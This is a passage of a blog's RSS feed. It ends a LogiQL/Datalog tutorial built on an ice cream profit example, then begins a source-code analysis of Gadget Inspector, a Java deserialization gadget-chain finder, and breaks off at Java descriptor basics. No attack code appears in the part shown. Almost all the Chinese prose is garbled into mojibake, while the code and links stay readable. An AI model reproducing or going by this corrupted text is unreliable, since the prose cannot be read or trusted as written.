revenue</li><li>æ¯ä¸ªå†°æ·‡æ·‹çš„æ”¶ç›Š&#x2F;å‘¨ï¼šprofit</li><li>æ‰€æœ‰å†°æ·‡æ·‹çš„æ”¶ç›Š&#x2F;å‘¨ï¼šweek profit</li></ul><p>å®šä¹‰åŠŸèƒ½è°“è¯ï¼ˆfunctional predicatesï¼‰</p><ul><li>è°“è¯ç±»ä¼¼ SQL æ•°æ®åº“ä¸­çš„è¡¨</li><li>é™¤äº†æœ€åä¸€åˆ—ä¹‹å¤–çš„æ‰€æœ‰åˆ—éƒ½å½¢æˆä¸€ä¸ªä¸»é”®ï¼Œæœ€åä¸€åˆ—è¡¨ç¤ºå€¼ï¼Œå› æ­¤ä¸€ä¸ªä¸»é”®æœ€å¤šå¯ä»¥å…³è”ä¸€ä¸ªå€¼ã€‚</li></ul><h3 id="1-cost-è°“è¯"><a href="#1-cost-è°“è¯" class="headerlink" title="1. cost è°“è¯"></a>1. <code>cost</code> è°“è¯</h3><p>å®šä¹‰åä¸º cost çš„è°“è¯ï¼Œé”®ä¸º icecreamï¼Œå€¼ä¸º cï¼›æŒ‡å‘å³ä¾§çš„ç®­å¤´è¡¨ç¤ºçº¦æŸï¼ˆconstraintï¼‰ï¼Œicecream çš„å€¼å¿…é¡»æ˜¯å­—ç¬¦ä¸²ã€c çš„å€¼å¿…é¡»æ˜¯æ•´æ•°</p><ul><li>çº¦æŸè¡¨æ˜å¦‚æœç®­å¤´å·¦ä¾§ä¸ºçœŸï¼Œåˆ™å³ä¾§å¿…é¡»æˆç«‹</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cost[icecream] = c -&gt;</span><br><span class="line">   string(icecream), int(c).</span><br></pre></td></tr></table></figure><p>åœ¨ REPL ä¸­æ‰§è¡Œéœ€è¦ä½¿ç”¨ç›¸åº”çš„å‘½ä»¤ï¼Œ<code>addblock</code> æ¥å—ä¸€ä¸ªå‚æ•°ï¼Œåœ¨å¼•å·ä¹‹é—´æ·»åŠ çš„å®šä¹‰çš„ LogiQL ä»£ç ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;cost[icecream] = c -&gt;</span></span><br><span class="line"><span class="string">   string(icecream), int(c).&#x27;</span></span><br></pre></td></tr></table></figure><p>æ·»åŠ ä¹‹åä½¿ç”¨ <code>list</code> å‘½ä»¤åˆ—å‡ºè°“è¯</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/oAX6JHgMvx5BeTu.png" width="80%"><h3 id="2-äº‹å®ï¼ˆfactsï¼‰"><a href="#2-äº‹å®ï¼ˆfactsï¼‰" class="headerlink" title="2. äº‹å®ï¼ˆfactsï¼‰"></a>2. äº‹å®ï¼ˆfactsï¼‰</h3><p>è°“è¯ä¸­çš„æ•°æ®æ¡ç›®åœ¨ LogiQL ä¸­ç§°ä¸ºäº‹å®ï¼ˆfactsï¼‰ã€‚</p><p>LogiQL æ”¯æŒ 3 ç§å¢é‡æ›´æ–°æ“ä½œ</p><ul><li>æ’å…¥ï¼ˆinsertï¼‰ï¼šæ’å…¥æ–°äº‹å®ï¼Œä½¿ç”¨ <code>+</code> å‰ç¼€</li><li>åˆ é™¤ï¼ˆremoveï¼‰ï¼šåˆ é™¤äº‹å®ï¼Œä½¿ç”¨ <code>-</code> å‰ç¼€ </li><li>æ›´æ–°ï¼ˆupsertï¼‰ï¼šæ·»åŠ æˆ–æ›´æ–°ï¼Œä½¿ç”¨ <code>^</code> å‰ç¼€ï¼Œåªèƒ½åº”ç”¨åœ¨åŠŸèƒ½è°“è¯ä¸Š</li></ul><p>ä½¿ç”¨ <code>exec</code> æ‰§è¡Œä¸€æ¬¡æ€§çš„å‘½ä»¤ï¼Œè€Œ <code>addblock</code> å¯ä»¥ç†è§£ä¸ºâ€œæ°¸ä¹…â€åœ°å°†è°“è¯æ·»åŠ åˆ°å·¥ä½œåŒºã€‚</p><p>æ·»åŠ ä¸€ä¸ªæˆæœ¬ä¸º 23 çš„å†°æ·‡æ·‹ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+cost[&quot;Popsicle Lemon&quot;] = 23.&#x27;</span></span><br></pre></td></tr></table></figure><p><code>print</code> å‘½ä»¤ç”¨äºæ‰“å°è°“è¯ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print cost</span><br></pre></td></tr></table></figure><p>æ·»åŠ å†°æ·‡æ·‹ï¼ˆæˆæœ¬ï¼‰ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+cost[&quot;Fruit Sundae&quot;] = 120.</span></span><br><span class="line"><span class="string">+cost[&quot;Mango Sorbet&quot;] = 40.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Chocolate&quot;] = 50.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Vanilla&quot;] = 44.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Chili Fries&quot;] = 200.&#x27;</span></span><br></pre></td></tr></table></figure><p>æ›´æ–°å†°æ·‡æ·‹çš„å”®ä»·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &#x27;^cost[&quot;Popsicle Lemon&quot;] = 25.&#x27;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/3XDQBGNLoMxwfv4.png"><h3 id="3-price-è°“è¯ã€week-sales-è°“è¯"><a href="#3-price-è°“è¯ã€week-sales-è°“è¯" class="headerlink" title="3. price è°“è¯ã€week_sales è°“è¯"></a>3. <code>price</code> è°“è¯ã€<code>week_sales</code> è°“è¯</h3><p>å®šä¹‰è°“è¯ price è¡¨ç¤ºå†°æ·‡æ·‹çš„å”®ä»·ï¼Œå®šä¹‰è°“è¯ week_sales è¡¨ç¤ºæ¯å‘¨çš„é”€å”®æ•°é‡ï¼ˆå¯ä»¥æŠŠ week_sales çœ‹ä½œäºŒç»´æ˜ å°„ï¼‰ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;price[icecream] = p -&gt;</span></span><br><span class="line"><span class="string">   string(icecream), int(p).</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">week_sales[icecream, week] = value -&gt;</span></span><br><span class="line"><span class="string">  string(icecream),</span></span><br><span class="line"><span class="string">  int(week),</span></span><br><span class="line"><span class="string">  int(value).&#x27;</span></span><br></pre></td></tr></table></figure><p>æ·»åŠ å†°æ·‡æ·‹å”®ä»·åŠå…¶ç¬¬ 1ã€2 å‘¨çš„é”€é‡ï¼ˆå¾€è°“è¯ä¸­æ·»åŠ äº‹å®ï¼‰ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+price[&quot;Popsicle Lemon&quot;] = 50.</span></span><br><span class="line"><span class="string">+price[&quot;Fruit Sundae&quot;] = 200.</span></span><br><span class="line"><span class="string">+price[&quot;Mango Sorbet&quot;] = 70.</span></span><br><span class="line"><span class="string">+price[&quot;Cone Chocolate&quot;] = 80.</span></span><br><span class="line"><span class="string">+price[&quot;Cone Vanilla&quot;] = 70.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+week_sales[&quot;Popsicle Lemon&quot;, 1] = 122.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Fruit Sundae&quot;, 1] = 88.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Mango Sorbet&quot;, 1] = 72.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Chocolate&quot;, 1] = 4.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Vanilla&quot;, 1] = 257.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+week_sales[&quot;Popsicle Lemon&quot;, 2] = 112.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Fruit Sundae&quot;, 2] = 60.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Mango Sorbet&quot;, 2] = 44.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Chocolate&quot;, 2] = 9.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Vanilla&quot;, 2] = 200.&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰“å°è°“è¯ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print price</span><br><span class="line">print week_sales</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/vmKatAVFYOID2XH.png" width="90%"><h3 id="4-è§„åˆ™ï¼ˆrulesï¼‰"><a href="#4-è§„åˆ™ï¼ˆrulesï¼‰" class="headerlink" title="4. è§„åˆ™ï¼ˆrulesï¼‰"></a>4. è§„åˆ™ï¼ˆrulesï¼‰</h3><p>è§„åˆ™å¯ç”¨äºæ¨å¯¼æ–°çš„äº‹å®ï¼Œæ·»åŠ è®¡ç®—æ”¶å…¥ <code>revenue</code> çš„è§„åˆ™ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;week_revenue[icecream, week] =</span></span><br><span class="line"><span class="string">  price[icecream] * week_sales[icecream, week].&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰“å°è§„åˆ™ï¼Œè¯¥è§„åˆ™ä¼šè‡ªåŠ¨è¿›è¡Œè®¡ç®—ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print week_revenue</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸€ä¸ªä»·æ ¼ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œé‡æ–°è®¡ç®—ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 70.&#x27;</span></span><br><span class="line"></span><br><span class="line">print week_revenue</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/goQXUZ2zTp9JxYV.png" width="80%"><p>æ·»åŠ è®¡ç®—å†°æ·‡æ·‹æ”¶ç›Š <code>profit</code> çš„è§„åˆ™ã€è®¡ç®—æ¯å‘¨æ”¶ç›Šçš„è§„åˆ™ <code>week_profit</code>ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;profit[icecream] =</span></span><br><span class="line"><span class="string">  price[icecream] - cost[icecream].</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">week_profit[icecream, week] =</span></span><br><span class="line"><span class="string">  profit[icecream] * week_sales[icecream, week].&#x27;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ‰“å°è§„åˆ™ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œè®¡ç®—ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print profit</span><br><span class="line">print week_profit</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/VB3QW2kjvSnFNMG.png" width="80%"><h3 id="5-èšåˆå‡½æ•°ï¼ˆAggregateï¼‰"><a href="#5-èšåˆå‡½æ•°ï¼ˆAggregateï¼‰" class="headerlink" title="5. èšåˆå‡½æ•°ï¼ˆAggregateï¼‰"></a>5. èšåˆå‡½æ•°ï¼ˆAggregateï¼‰</h3><p>å’Œ SQL ç±»ä¼¼ï¼ŒLogiQL ä¸­ä¹Ÿæœ‰èšåˆå‡½æ•°ã€‚</p><p>å®šä¹‰ agg_profit è§„åˆ™ï¼Œä½¿ç”¨ <code>total()</code> èšåˆå‡½æ•°æ±‚å’Œï¼Œå°† profit ä¸­æ‰€æœ‰äº‹å®çš„å€¼ p æ±‚å’Œç»‘å®šåˆ° valueï¼Œå…¶ä¸­ week æ˜¯èšåˆçš„å‘¨ï¼Œä½¿ç”¨é€šé…ç¬¦ <code>_</code> å¿½ç•¥å†°æ·‡æ·‹ç±»å‹ã€‚è¡¨ç¤ºæ€»æ”¶ç›Šï¼ˆæ”¶å…¥-æˆæœ¬ï¼‰ã€‚</p><p>agg_revenue è§„åˆ™ä¹Ÿæ˜¯ç±»ä¼¼çš„å®šä¹‰ï¼Œåªä¸è¿‡æŠŠ p æ¢æˆäº† rï¼Œè¡¨ç¤ºæ€»æ”¶å…¥ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">agg_profit[week] = value &lt;-</span><br><span class="line">   agg&lt;&lt;value=total(p)&gt;&gt; week_profit[<span class="symbol">_</span>, week] = p.</span><br><span class="line"> </span><br><span class="line">agg_revenue[week] = value &lt;-</span><br><span class="line">   agg&lt;&lt;value=total(r)&gt;&gt; week_revenue[<span class="symbol">_</span>, week] = r.</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>addblock</code> æ·»åŠ è§„åˆ™ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;agg_profit[week] = value &lt;-</span></span><br><span class="line"><span class="string">    agg&lt;&lt;value=total(p)&gt;&gt; week_profit[_, week] = p.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">agg_revenue[week] = value &lt;-</span></span><br><span class="line"><span class="string">   agg&lt;&lt;value=total(r)&gt;&gt; week_revenue[_, week] = r.&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰“å°è§„åˆ™ï¼Œå¾—åˆ°èšåˆçš„ç»“æœï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print agg_profit</span><br><span class="line">print agg_revenue</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/itCR34j9Fl5PGkI.png" width="85%"><p>å®šä¹‰ä¸€ä¸ªæ²¡æœ‰é”®çš„è§„åˆ™è®¡ç®— price è°“è¯ä¸­çš„äº‹å®ï¼ˆæ¡ç›®ï¼‰æ•°é‡ï¼Œå³å†°æ·‡æ·‹ç±»å‹çš„æ•°é‡ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;icecream_count[] = value &lt;-</span></span><br><span class="line"><span class="string">    agg&lt;&lt;value=count()&gt;&gt; price[_] = _.&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰“å°è§„åˆ™ï¼Œå¾—åˆ°å†°æ·‡æ·‹ç±»å‹çš„æ•°é‡ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print icecream_count</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/zhCBUYFmRMZawT1.png" width="80%"><h3 id="6-æŸ¥è¯¢ï¼ˆqueryï¼‰"><a href="#6-æŸ¥è¯¢ï¼ˆqueryï¼‰" class="headerlink" title="6. æŸ¥è¯¢ï¼ˆqueryï¼‰"></a>6. æŸ¥è¯¢ï¼ˆqueryï¼‰</h3><p>ä¹‹å‰ä½¿ç”¨ print æŸ¥çœ‹è°“è¯å’Œè§„åˆ™çš„å€¼ï¼Œç°åœ¨å¯ä»¥ç”¨ query æ‰§è¡Œæ›´é«˜çº§çš„æŸ¥è¯¢ã€‚</p><p>å®šä¹‰ä¸€ä¸ªè°“è¯ <code>_</code> ç”¨äº‹å®å¡«å……ï¼Œé€šå¸¸ä½¿ç”¨è§„åˆ™å®ç°ã€‚</p><p>ä¸‹é¢çš„æŸ¥è¯¢ä¸ <code>print week_sales</code> æ‹¥æœ‰ç­‰ä»·çš„ç»“æœã€‚è¿™é‡Œä¸ä½¿ç”¨åŠŸèƒ½è°“è¯è¯­æ³• <code>predicate[k1, k2] = v</code>ï¼Œè€Œæ˜¯ä½¿ç”¨ <code>predicate(k1, k2, k3)</code>ï¼Œå› ä¸ºè¿™é‡Œå¯¹é”®å€¼ä¸æ„Ÿå…´è¶£ï¼Œåªå¯¹äº‹å®æ„Ÿå…´è¶£ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream, week, value) &lt;-</span></span><br><span class="line"><span class="string">  week_sales[icecream, week] = value.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/iXhUMutwd63Sxfz.png" width="95%"><p>æ£€ç´¢ week_sales è°“è¯ä¸­ä½¿ç”¨çš„æ‰€æœ‰å†°æ·‡æ·‹ï¼Œå°½ç®¡ week_sales è°“è¯å¤šæ¬¡åŒ…å«è¿™äº›å€¼ä¸­çš„æ¯ä¸€ä¸ªï¼Œä½†æ¯ä¸ªä¸åŒå€¼åªè¿”å›ä¸€æ¬¡ï¼ˆæœ‰ 1ã€2 ä¸¤å‘¨çš„æ•°æ®ï¼Œæ‰€ä»¥å†°æ·‡æ·‹é‡å¤å‡ºç°ï¼‰</p><ul><li>åœ¨ LogiQL ä¸­æ‰€æœ‰è°“è¯éƒ½æ˜¯é›†åˆï¼šæ¯ä¸€è¡Œåªèƒ½å‡ºç°ä¸€æ¬¡</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream) &lt;- week_sales[icecream, _] = _.&#x27;</span></span><br></pre></td></tr></table></figure><p>å°†å†°æ·‡æ·‹å’Œæ¯å‘¨çš„é”€å”®é¢ã€æ”¶å…¥ã€æ”¶ç›Šæ•´åˆåœ¨ä¸€èµ·ï¼Œå°±åƒ SQL ä¸­çš„ JOIN æ“ä½œï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream, week, sales, revenue, profit) &lt;-</span></span><br><span class="line"><span class="string">  week_sales[icecream, week] = sales,</span></span><br><span class="line"><span class="string">  week_revenue[icecream, week] = revenue,</span></span><br><span class="line"><span class="string">  week_profit[icecream, week] = profit.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/6QKeRXIA9wf3c4j.png" width="80%"><h3 id="7-çº¦æŸï¼ˆconstraintï¼‰"><a href="#7-çº¦æŸï¼ˆconstraintï¼‰" class="headerlink" title="7. çº¦æŸï¼ˆconstraintï¼‰"></a>7. çº¦æŸï¼ˆconstraintï¼‰</h3><p>é™ä½å†°æ·‡æ·‹çš„å”®ä»·ï¼Œå†æ¬¡æŸ¥è¯¢å‘ç°å†°æ·‡æ·‹çš„æ”¶ç›Šå˜æˆäº†è´Ÿæ•°ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 20.&#x27;</span></span><br><span class="line">query <span class="string">&#x27;_(profit) &lt;- profit[&quot;Popsicle Lemon&quot;] = profit.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/UwXr3PaOCH7bV4G.png" width="80%"><p>å®šä¹‰ä¸€ä¸ªçº¦æŸï¼šå¯¹äº profit è°“è¯ä¸­çš„æ¯ä¸ªäº‹å®ï¼Œvalue åº”è¯¥å¤§äºç­‰äº 0ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profit[<span class="symbol">_</span>] = value -&gt; value &gt;= <span class="number">0.</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>addblock</code> æ·»åŠ çº¦æŸï¼Œå› ä¸º profit è°“è¯ä¸­æœ‰äº‹å®çš„ value å€¼å°äº 0ï¼Œæ‰€ä»¥æ·»åŠ çº¦æŸå¤±è´¥ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;profit[_] = value -&gt; value &gt;= 0.&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å†°æ·‡æ·‹å”®ä»·åå†æ·»åŠ çº¦æŸï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 40.&#x27;</span></span><br><span class="line">addblock <span class="string">&#x27;profit[_] = value -&gt; value &gt;= 0.&#x27;</span></span><br></pre></td></tr></table></figure><p>å†æ¬¡ä¿®æ”¹å†°æ·‡æ·‹å”®ä»·ï¼Œè¿”å›çº¦æŸé”™è¯¯ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 10.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/9TnycWQ4ZeBCJob.png"><h1 id="0x02-ç»“è¯­"><a href="#0x02-ç»“è¯­" class="headerlink" title="0x02 ç»“è¯­"></a>0x02 ç»“è¯­</h1><p>æœ‰ä¸€è¯´ä¸€ï¼Œè¿™ä¸ªå…¥é—¨å®Œå…¨ä¸è¶³ä»¥è®©äººçœ‹æ‡‚ <a href="https://bitbucket.org/yanniss/doop/src/master/lb-logic/">doop&#x2F;lb-logic</a> é‡Œé¢çš„è§„åˆ™ï¼Œåšéƒ½åšäº†å°±ç†ä¸Šæ¥äº†XD</p><p>è¡¥å……ï¼šæœ¬åœ°å¯ä»¥ä½¿ç”¨ <a href="http://snf-705535.vm.okeanos.grnet.gr/agreement.html">PA-Datalog</a> å¼•æ“ï¼Œæ˜¯ LogicBlox v3 çš„æ”¹è‰¯ç‰ˆæœ¬ï¼Œå¯ç”¨äºç¨‹åºåˆ†æã€‚</p>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Other/">Other</category>
      
      
      <category domain="https://jckling.github.io/tags/Datalog/">Datalog</category>
      
      
      <comments>https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Gadget Inspector æºç è§£æ</title>
      <link>https://jckling.github.io/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</link>
      <guid>https://jckling.github.io/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</guid>
      <pubDate>Tue, 12 Oct 2021 03:41:30 GMT</pubDate>
      
      <description>æ„Ÿè§‰è‡ªå·±çœ‹äº†å¥½ä¹…å¥½ä¹…... é•¿æ–‡è­¦å‘Šâš ï¸</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>Netflix å·¥ç¨‹å¸ˆå¼€å‘çš„ Gadget Inspector æ˜¯ä¸€ä¸ªç”¨äºæŒ–æ˜ Java ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾çš„å·¥å…·ï¼Œç½‘ä¸Šæœ‰ä¸¤ä¸ªåŒåèµ„æ–™ Automated Discovery of Deserialization Gadget Chainsï¼š<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf">è®ºæ–‡</a>ã€<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">PPT</a>ã€‚çœ‹æ‡‚å·¥ä½œæµç¨‹å¹¶ä¸éš¾ï¼Œå…¥å£ç±»éå¸¸æ¸…æ™°æ˜äº†ï¼Œä¸»è¦æ˜¯é€†æ‹“æ‰‘æ’åºã€JVM æ¨¡æ‹Ÿï¼ˆæœ¬åœ°å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆï¼‰çš„éƒ¨åˆ†æ¯”è¾ƒæ™¦æ¶©ã€‚é‰´äºæˆ‘å››èˆäº”å…¥ç®—æ˜¯é›¶åŸºç¡€æ¥è§¦ Javaï¼Œæ‰€ä»¥å‰é¢å…ˆè¡¥å……ä¸€äº›ç›¸å…³çŸ¥è¯†ï¼Œåé¢å†è¯¦ç»†è§£æ Gadget Inspector çš„ä»£ç ã€‚</p><p>åŠ äº†æ³¨é‡Šçš„æºç ï¼š<a href="https://github.com/jckling/gadgetinspector">jckling&#x2F;gadgetinspector</a></p><h1 id="0x01-é¢„å¤‡çŸ¥è¯†"><a href="#0x01-é¢„å¤‡çŸ¥è¯†" class="headerlink" title="0x01 é¢„å¤‡çŸ¥è¯†"></a>0x01 é¢„å¤‡çŸ¥è¯†</h1><h2 id="1-1-Java-å­—èŠ‚ç "><a href="#1-1-Java-å­—èŠ‚ç " class="headerlink" title="1.1 Java å­—èŠ‚ç "></a>1.1 Java å­—èŠ‚ç </h2><p>çœ‹ç¾å›¢çš„ <a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">å­—èŠ‚ç å¢å¼ºæŠ€æœ¯æ¢ç´¢</a> é‡Œé¢çš„ä»‹ç»å°±å¤Ÿäº†ï¼Œå†…å®¹åŒ…æ‹¬ java çš„å­—èŠ‚ç ã€asm æ¡†æ¶ã€Javassist æ¡†æ¶ä»¥åŠ instrument ç±»åº“ã€‚</p><p><strong>é™å®šåï¼ˆqualified namesï¼‰</strong>ï¼šåç§°ã€<code>.</code>ã€æ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚ï¼šdemo.servlet.HelloServletï¼Œæœ‰äº›åœ°æ–¹ç”¨ <code>/</code> ä»£æ›¿ç‚¹å·</p><p><strong>ç®€å•åç§°ï¼ˆsimple nameï¼‰</strong>ï¼šå•ä¸ªæ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚ï¼štest</p><p><strong>å®Œå…¨é™å®šåï¼ˆfully qualified namesï¼‰</strong>ï¼šæ¯ä¸ªåŸå§‹ç±»å‹ã€å‘½ååŒ…ã€é¡¶çº§ç±»å’Œé¡¶çº§æ¥å£éƒ½æœ‰ä¸€ä¸ªå®Œå…¨é™å®šåï¼Œæœ‰çš„æ˜¯ç®€å•åç§°æœ‰çš„æ˜¯é™å®šåï¼Œè¯¦è§ <a href="https://docs.oracle.com/javase/specs/jls/se17/html/jls-6.html#jls-6.7">6.7. Fully Qualified Names and Canonical Names</a></p><p><strong>æè¿°ç¬¦ï¼ˆDescriptorï¼‰</strong></p><ol><li><p>å­—æ®µï¼ˆFieldï¼‰æè¿°ç¬¦</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">FieldDescriptor:</span><br><span class="line">FieldType</span><br><span class="line"></span><br><span class="line">FieldType:</span><br><span class="line">    BaseType</span><br><span class="line">    ObjectType</span><br><span class="line">    ArrayType</span><br><span class="line">   </span><br><span class="line">BaseType:</span><br><span class="line">    B</span><br><span class="line">    C</span><br><span class="line">    D</span><br><span class="line">    F</span><br><span class="line">    I</span><br><span class="line">    J</span><br><span class="line">    